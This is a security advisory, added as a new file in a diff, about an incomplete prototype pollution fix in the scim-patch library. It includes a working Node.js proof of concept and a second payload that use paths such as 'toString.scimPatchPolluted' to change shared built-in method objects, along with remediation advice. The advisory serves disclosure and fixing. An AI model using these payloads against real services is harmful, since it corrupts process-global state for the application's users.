@@ -1,0 +1,53 @@
+Summary
+Incomplete Prototype Pollution Fix Allows Mutation of Inherited Built-in Method Objects
+
+scim-patch blocks direct dangerous path segments such as __proto__, constructor, and prototype, but still traverses inherited properties when applying SCIM patch paths.
+
+An attacker who controls a SCIM PATCH operation can use paths such as toString.polluted to mutate shared built-in function objects, for example Object.prototype.toString.
+
+Impact
+A malicious patch can add attacker-controlled properties to inherited built-in method objects. The impact is narrower than direct Object.prototype pollution, but the mutation is process-global and may affect application logic that reads properties from inherited methods.
+
+Details
+Affected code paths:
+
+navigate() reads inherited properties via schema[subPath]
+assign() uses key in obj, which treats inherited properties as existing
+Because inherited keys are followed, safe-looking path segments such as toString can resolve to shared built-in objects.
+
+PoC
+const assert = require("node:assert/strict");
+const { scimPatch } = require("./lib/src/scimPatch");
+
+const victim = {
+  schemas: ["urn:ietf:params:scim:schemas:core:2.0:User"],
+  userName: "alice",
+  active: true,
+  emails: [{ value: "alice@example.com", primary: true }],
+  meta: { created: "x", lastModified: "x", resourceType: "User" }
+};
+
+try {
+  assert.equal(({}).toString.scimPatchPolluted, undefined);
+
+  scimPatch(victim, [
+    { op: "add", path: "toString.scimPatchPolluted", value: "polluted" }
+  ]);
+
+  assert.equal(({}).toString.scimPatchPolluted, "polluted");
+  console.log(({}).toString.scimPatchPolluted);
+} finally {
+  delete Object.prototype.toString.scimPatchPolluted;
+}
+Output:
+
+polluted
+A no-path operation with a dotted value key is also affected:
+
+scimPatch(victim, [
+  { op: "add", value: { "toString.noPathPolluted": "polluted" } }
+]);
+Remediation
+Do not traverse inherited properties while resolving patch paths. Use own-property checks such as Object.hasOwn(obj, key) and create missing containers only for safe own keys.
+
+Keep the existing denylist for __proto__, constructor, and prototype as defense in depth.
